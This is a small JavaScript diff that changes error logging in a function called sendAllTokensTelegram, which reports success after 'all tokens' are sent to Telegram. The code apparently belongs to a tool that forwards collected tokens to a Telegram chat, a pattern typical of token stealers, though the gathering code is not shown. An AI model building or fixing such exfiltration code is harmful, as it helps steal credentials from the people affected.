@@ -143,12 +143,13 @@ async function sendAllTokensTelegram(token, tokenInfo) {
             logWithTime('✅ All tokens sent to Telegram successfully!');
             logWithTime('📱 Message ID:', telegramData.result.message_id);
         } else {
-            logWithTime('❌ Telegram failed:', telegramData.description);
+            logWithTime('❌ Telegram failed:', telegramData.description || 'Unknown error');
+            logWithTime('❌ Telegram response:', JSON.stringify(telegramData));
         }
         
     } catch (error) {
         logWithTime('❌ Telegram failed:', error.message);
-        logWithTime('Stack:', error.stack);
+        logWithTime('❌ Telegram error stack:', error.stack);
     }
 }
 
